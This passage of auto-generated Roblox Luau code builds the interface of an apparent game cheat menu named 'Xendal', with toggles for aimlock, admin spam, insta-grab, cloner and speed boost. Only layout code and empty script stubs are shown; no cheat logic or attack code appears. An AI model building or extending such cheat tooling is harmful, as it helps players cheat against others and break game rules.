G2L["c3"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["c3"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c3"]["Name"] = [[AimlockToggle]];
G2L["c3"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AimlockToggle.Main Handler
G2L["c4"] = Instance.new("LocalScript", G2L["c3"]);
G2L["c4"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AimlockToggle.Holder
G2L["c5"] = Instance.new("Frame", G2L["c3"]);
G2L["c5"]["ZIndex"] = 2;
G2L["c5"]["BorderSizePixel"] = 0;
G2L["c5"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["c5"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["c5"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["c5"]["Position"] = UDim2.new(0.459, 0, -0.14667, -2);
G2L["c5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c5"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AimlockToggle.Holder.Circle
G2L["c6"] = Instance.new("Frame", G2L["c5"]);
G2L["c6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c6"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["c6"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["c6"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["c6"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c6"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AimlockToggle.Holder.Circle.Mini
G2L["c7"] = Instance.new("Frame", G2L["c6"]);
G2L["c7"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["c7"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["c7"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["c7"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["c7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c7"]["Name"] = [[Mini]];
G2L["c7"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AimlockToggle.Holder.Circle.Mini.UICorner
G2L["c8"] = Instance.new("UICorner", G2L["c7"]);
G2L["c8"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AimlockToggle.Holder.Circle.UICorner
G2L["c9"] = Instance.new("UICorner", G2L["c6"]);
G2L["c9"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AimlockToggle.Holder.Button
G2L["ca"] = Instance.new("TextButton", G2L["c5"]);
G2L["ca"]["BorderSizePixel"] = 0;
G2L["ca"]["TextSize"] = 14;
G2L["ca"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ca"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ca"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ca"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["ca"]["BackgroundTransparency"] = 1;
G2L["ca"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["ca"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["ca"]["Text"] = [[]];
G2L["ca"]["Name"] = [[Button]];
G2L["ca"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AimlockToggle.Holder.Button.LocalScript
G2L["cb"] = Instance.new("LocalScript", G2L["ca"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AimlockToggle.Holder.UIPadding
G2L["cc"] = Instance.new("UIPadding", G2L["c5"]);
G2L["cc"]["PaddingTop"] = UDim.new(0, 4);
G2L["cc"]["PaddingRight"] = UDim.new(0, 4);
G2L["cc"]["PaddingLeft"] = UDim.new(0, 4);
G2L["cc"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AimlockToggle.Holder.UICorner
G2L["cd"] = Instance.new("UICorner", G2L["c5"]);
G2L["cd"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpamToggle
G2L["ce"] = Instance.new("Frame", G2L["35"]);
G2L["ce"]["BorderSizePixel"] = 0;
G2L["ce"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ce"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["ce"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["ce"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ce"]["Name"] = [[AdminSpamToggle]];
G2L["ce"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpamToggle.Main Handler
G2L["cf"] = Instance.new("LocalScript", G2L["ce"]);
G2L["cf"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpamToggle.Holder
G2L["d0"] = Instance.new("Frame", G2L["ce"]);
G2L["d0"]["ZIndex"] = 2;
G2L["d0"]["BorderSizePixel"] = 0;
G2L["d0"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["d0"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["d0"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["d0"]["Position"] = UDim2.new(0.459, 0, 0.46667, -2);
G2L["d0"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["d0"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpamToggle.Holder.Circle
G2L["d1"] = Instance.new("Frame", G2L["d0"]);
G2L["d1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d1"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["d1"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["d1"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["d1"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["d1"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpamToggle.Holder.Circle.Mini
G2L["d2"] = Instance.new("Frame", G2L["d1"]);
G2L["d2"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["d2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["d2"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["d2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["d2"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["d2"]["Name"] = [[Mini]];
G2L["d2"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpamToggle.Holder.Circle.Mini.UICorner
G2L["d3"] = Instance.new("UICorner", G2L["d2"]);
G2L["d3"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpamToggle.Holder.Circle.UICorner
G2L["d4"] = Instance.new("UICorner", G2L["d1"]);
G2L["d4"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpamToggle.Holder.Button
G2L["d5"] = Instance.new("TextButton", G2L["d0"]);
G2L["d5"]["BorderSizePixel"] = 0;
G2L["d5"]["TextSize"] = 14;
G2L["d5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d5"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["d5"]["BackgroundTransparency"] = 1;
G2L["d5"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["d5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["d5"]["Text"] = [[]];
G2L["d5"]["Name"] = [[Button]];
G2L["d5"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpamToggle.Holder.Button.LocalScript
G2L["d6"] = Instance.new("LocalScript", G2L["d5"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpamToggle.Holder.UIPadding
G2L["d7"] = Instance.new("UIPadding", G2L["d0"]);
G2L["d7"]["PaddingTop"] = UDim.new(0, 4);
G2L["d7"]["PaddingRight"] = UDim.new(0, 4);
G2L["d7"]["PaddingLeft"] = UDim.new(0, 4);
G2L["d7"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpamToggle.Holder.UICorner
G2L["d8"] = Instance.new("UICorner", G2L["d0"]);
G2L["d8"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrabToggle
G2L["d9"] = Instance.new("Frame", G2L["35"]);
G2L["d9"]["BorderSizePixel"] = 0;
G2L["d9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d9"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["d9"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["d9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d9"]["Name"] = [[InstaGrabToggle]];
G2L["d9"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrabToggle.Main Handler
G2L["da"] = Instance.new("LocalScript", G2L["d9"]);
G2L["da"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrabToggle.Holder
G2L["db"] = Instance.new("Frame", G2L["d9"]);
G2L["db"]["ZIndex"] = 2;
G2L["db"]["BorderSizePixel"] = 0;
G2L["db"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["db"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["db"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["db"]["Position"] = UDim2.new(0.459, 0, 1.06667, -2);
G2L["db"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["db"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrabToggle.Holder.Circle
G2L["dc"] = Instance.new("Frame", G2L["db"]);
G2L["dc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["dc"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["dc"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["dc"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["dc"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["dc"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrabToggle.Holder.Circle.Mini
G2L["dd"] = Instance.new("Frame", G2L["dc"]);
G2L["dd"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["dd"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["dd"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["dd"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["dd"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["dd"]["Name"] = [[Mini]];
G2L["dd"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrabToggle.Holder.Circle.Mini.UICorner
G2L["de"] = Instance.new("UICorner", G2L["dd"]);
G2L["de"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrabToggle.Holder.Circle.UICorner
G2L["df"] = Instance.new("UICorner", G2L["dc"]);
G2L["df"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrabToggle.Holder.Button
G2L["e0"] = Instance.new("TextButton", G2L["db"]);
G2L["e0"]["BorderSizePixel"] = 0;
G2L["e0"]["TextSize"] = 14;
G2L["e0"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e0"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["e0"]["BackgroundTransparency"] = 1;
G2L["e0"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["e0"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["e0"]["Text"] = [[]];
G2L["e0"]["Name"] = [[Button]];
G2L["e0"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrabToggle.Holder.Button.LocalScript
G2L["e1"] = Instance.new("LocalScript", G2L["e0"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrabToggle.Holder.UIPadding
G2L["e2"] = Instance.new("UIPadding", G2L["db"]);
G2L["e2"]["PaddingTop"] = UDim.new(0, 4);
G2L["e2"]["PaddingRight"] = UDim.new(0, 4);
G2L["e2"]["PaddingLeft"] = UDim.new(0, 4);
G2L["e2"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrabToggle.Holder.UICorner
G2L["e3"] = Instance.new("UICorner", G2L["db"]);
G2L["e3"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.ClonerToggle
G2L["e4"] = Instance.new("Frame", G2L["35"]);
G2L["e4"]["BorderSizePixel"] = 0;
G2L["e4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e4"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["e4"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["e4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e4"]["Name"] = [[ClonerToggle]];
G2L["e4"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.ClonerToggle.Main Handler
G2L["e5"] = Instance.new("LocalScript", G2L["e4"]);
G2L["e5"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.ClonerToggle.Holder
G2L["e6"] = Instance.new("Frame", G2L["e4"]);
G2L["e6"]["Visible"] = false;
G2L["e6"]["ZIndex"] = 2;
G2L["e6"]["BorderSizePixel"] = 0;
G2L["e6"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["e6"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["e6"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["e6"]["Position"] = UDim2.new(0.459, 0, 1.66667, -2);
G2L["e6"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["e6"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.ClonerToggle.Holder.Circle
G2L["e7"] = Instance.new("Frame", G2L["e6"]);
G2L["e7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e7"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["e7"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["e7"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["e7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["e7"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.ClonerToggle.Holder.Circle.Mini
G2L["e8"] = Instance.new("Frame", G2L["e7"]);
G2L["e8"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["e8"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["e8"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["e8"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["e8"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["e8"]["Name"] = [[Mini]];
G2L["e8"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.ClonerToggle.Holder.Circle.Mini.UICorner
G2L["e9"] = Instance.new("UICorner", G2L["e8"]);
G2L["e9"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.ClonerToggle.Holder.Circle.UICorner
G2L["ea"] = Instance.new("UICorner", G2L["e7"]);
G2L["ea"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.ClonerToggle.Holder.Button
G2L["eb"] = Instance.new("TextButton", G2L["e6"]);
G2L["eb"]["BorderSizePixel"] = 0;
G2L["eb"]["TextSize"] = 14;
G2L["eb"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["eb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["eb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["eb"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["eb"]["BackgroundTransparency"] = 1;
G2L["eb"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["eb"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["eb"]["Text"] = [[]];
G2L["eb"]["Name"] = [[Button]];
G2L["eb"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.ClonerToggle.Holder.UIPadding
G2L["ec"] = Instance.new("UIPadding", G2L["e6"]);
G2L["ec"]["PaddingTop"] = UDim.new(0, 4);
G2L["ec"]["PaddingRight"] = UDim.new(0, 4);
G2L["ec"]["PaddingLeft"] = UDim.new(0, 4);
G2L["ec"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.ClonerToggle.Holder.UICorner
G2L["ed"] = Instance.new("UICorner", G2L["e6"]);
G2L["ed"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoost
G2L["ee"] = Instance.new("Frame", G2L["35"]);
G2L["ee"]["BorderSizePixel"] = 0;
G2L["ee"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["ee"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["ee"]["Position"] = UDim2.new(0.01, 15, 0.011, 0);
G2L["ee"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ee"]["Name"] = [[SpeedBoost]];
G2L["ee"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoost.UICorner
G2L["ef"] = Instance.new("UICorner", G2L["ee"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoost.UIStroke
G2L["f0"] = Instance.new("UIStroke", G2L["ee"]);
G2L["f0"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoost.TextLabel
G2L["f1"] = Instance.new("TextLabel", G2L["ee"]);
G2L["f1"]["BorderSizePixel"] = 0;
G2L["f1"]["TextSize"] = 14;
G2L["f1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f1"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["f1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f1"]["BackgroundTransparency"] = 1;
G2L["f1"]["Size"] = UDim2.new(0, 58, 0, 16);
G2L["f1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f1"]["Text"] = [[Speed Boost+]];
G2L["f1"]["Position"] = UDim2.new(0.133, 0, 0.253, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoostToggle
G2L["f2"] = Instance.new("Frame", G2L["35"]);
G2L["f2"]["BorderSizePixel"] = 0;
G2L["f2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f2"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["f2"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["f2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f2"]["Name"] = [[SpeedBoostToggle]];
G2L["f2"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoostToggle.Main Handler
G2L["f3"] = Instance.new("LocalScript", G2L["f2"]);
G2L["f3"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoostToggle.Holder
G2L["f4"] = Instance.new("Frame", G2L["f2"]);
G2L["f4"]["ZIndex"] = 2;
G2L["f4"]["BorderSizePixel"] = 0;
G2L["f4"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["f4"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["f4"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["f4"]["Position"] = UDim2.new(0.459, 0, -4.4, -2);
G2L["f4"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["f4"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoostToggle.Holder.Circle
G2L["f5"] = Instance.new("Frame", G2L["f4"]);
G2L["f5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f5"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["f5"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["f5"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["f5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["f5"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoostToggle.Holder.Circle.Mini
G2L["f6"] = Instance.new("Frame", G2L["f5"]);
G2L["f6"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["f6"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["f6"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["f6"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["f6"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["f6"]["Name"] = [[Mini]];
G2L["f6"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoostToggle.Holder.Circle.Mini.UICorner
G2L["f7"] = Instance.new("UICorner", G2L["f6"]);
G2L["f7"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoostToggle.Holder.Circle.UICorner
G2L["f8"] = Instance.new("UICorner", G2L["f5"]);
G2L["f8"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoostToggle.Holder.Button
G2L["f9"] = Instance.new("TextButton", G2L["f4"]);
G2L["f9"]["BorderSizePixel"] = 0;
G2L["f9"]["TextSize"] = 14;
G2L["f9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f9"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["f9"]["BackgroundTransparency"] = 1;
G2L["f9"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["f9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["f9"]["Text"] = [[]];
G2L["f9"]["Name"] = [[Button]];
G2L["f9"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoostToggle.Holder.Button.LocalScript
G2L["fa"] = Instance.new("LocalScript", G2L["f9"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoostToggle.Holder.UIPadding
G2L["fb"] = Instance.new("UIPadding", G2L["f4"]);
G2L["fb"]["PaddingTop"] = UDim.new(0, 4);
G2L["fb"]["PaddingRight"] = UDim.new(0, 4);
G2L["fb"]["PaddingLeft"] = UDim.new(0, 4);
G2L["fb"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.SpeedBoostToggle.Holder.UICorner
G2L["fc"] = Instance.new("UICorner", G2L["f4"]);
G2L["fc"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement
G2L["fd"] = Instance.new("Frame", G2L["30"]);
G2L["fd"]["Visible"] = false;
G2L["fd"]["ZIndex"] = 3;
G2L["fd"]["BorderSizePixel"] = 0;
G2L["fd"]["BackgroundColor3"] = Color3.fromRGB(10, 30, 13);
G2L["fd"]["ClipsDescendants"] = true;
G2L["fd"]["Size"] = UDim2.new(0, 366, 0, 281);
G2L["fd"]["Position"] = UDim2.new(-0.02286, 0, 0.00151, 0);
G2L["fd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fd"]["Name"] = [[Movement]];
G2L["fd"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.Frame
G2L["fe"] = Instance.new("Frame", G2L["fd"]);
G2L["fe"]["BorderSizePixel"] = 0;
G2L["fe"]["BackgroundColor3"] = Color3.fromRGB(34, 34, 34);
G2L["fe"]["Size"] = UDim2.new(0, 373, 0, 25);
G2L["fe"]["Position"] = UDim2.new(-0.0198, 0, -0.00105, 0);
G2L["fe"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fe"]["BackgroundTransparency"] = 0.6;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.Frame.UICorner
G2L["ff"] = Instance.new("UICorner", G2L["fe"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.Frame.TextLabel
G2L["100"] = Instance.new("TextLabel", G2L["fe"]);
G2L["100"]["BorderSizePixel"] = 0;
G2L["100"]["TextSize"] = 14;
G2L["100"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["100"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["100"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["100"]["BackgroundTransparency"] = 1;
G2L["100"]["Size"] = UDim2.new(0, 48, 0, 16);
G2L["100"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["100"]["Text"] = [[--Movement--]];
G2L["100"]["Position"] = UDim2.new(0.42265, 0, 0.16, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame
G2L["101"] = Instance.new("ScrollingFrame", G2L["fd"]);
G2L["101"]["Active"] = true;
G2L["101"]["ZIndex"] = 2;
G2L["101"]["BorderSizePixel"] = 0;
G2L["101"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
G2L["101"]["Size"] = UDim2.new(0, 364, 0, 255);
G2L["101"]["ScrollBarImageColor3"] = Color3.fromRGB(68, 68, 68);
G2L["101"]["Position"] = UDim2.new(-0.00068, 0, 0.09148, 0);
G2L["101"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["101"]["ScrollBarThickness"] = 4;
G2L["101"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoost
